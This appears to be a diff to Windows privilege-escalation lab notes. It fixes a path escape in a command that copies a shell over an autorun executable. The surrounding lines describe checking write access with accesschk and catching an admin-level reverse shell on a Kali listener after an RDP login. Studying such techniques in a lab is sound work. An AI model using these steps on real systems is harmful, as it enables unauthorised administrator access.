@@ -308,7 +308,7 @@ Windows stores all the necessary data that is related to services in the registr
   * accesschk.exe /accepteula -wvu "\\\<path>\\\<file.exe>"
 
 * copy a shell to auto run executable:
-  * copy \\<path>\\\<file.exe> "\\\<path>\\\<file.exe>" /Y
+  * copy \<path>\\\<file.exe> "\\\<path>\\\<file.exe>" /Y
  
 * Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it.
 
